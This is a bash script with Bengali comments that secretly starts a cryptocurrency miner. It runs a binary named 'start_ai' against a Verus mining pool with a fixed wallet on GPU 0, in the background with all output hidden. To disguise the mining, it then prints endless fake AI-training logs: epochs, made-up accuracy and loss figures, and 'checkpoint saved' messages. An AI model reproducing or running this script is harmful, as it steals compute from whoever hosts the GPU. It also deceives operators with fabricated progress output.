#!/bin/bash

# মাইনিং GPU ডিভাইস 0 দিয়ে পেছনে চালাও, আউটপুট সম্পূর্ণ লুকানো
./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -d 0 > /dev/null 2>&1 &

# ফেক AI ট্রেনিং আউটপুট দেখাও
echo "🤖 Initializing AI Model..."
sleep 2

epoch=1
while true
do
  acc=$(awk "BEGIN { printf \"%.2f\", 85 + (RANDOM % 100) / 10 }")
  loss=$(awk "BEGIN { printf \"%.2f\", (RANDOM % 50) / 100 }")
  echo "📊 Epoch $epoch - Accuracy: ${acc}% - Loss: ${loss}"
  sleep 10
  if (( epoch % 5 == 0 )); then
    echo "💾 Model checkpoint saved."
  fi
  epoch=$((epoch + 1))
done
